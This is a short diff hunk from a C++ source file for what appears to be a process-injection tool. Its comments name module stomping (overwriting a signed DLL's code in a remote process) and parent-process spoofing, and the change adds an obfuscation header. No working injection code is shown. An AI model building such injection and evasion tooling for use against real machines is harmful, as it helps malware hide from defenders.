@@ -5,11 +5,13 @@
 // StompModule: module stomping — overwrite .text of a signed DLL in remote process.
 #include "injection.hpp"
 #include "syscalls.hpp"
+#include "obfuscate.hpp"
 #include <windows.h>
 #include <tlhelp32.h>
 #include <cstdint>
 #include <string>
 #include <vector>
+
 
 // ============================================================
 // PPID Spoofing — spawn a process under a legitimate parent.
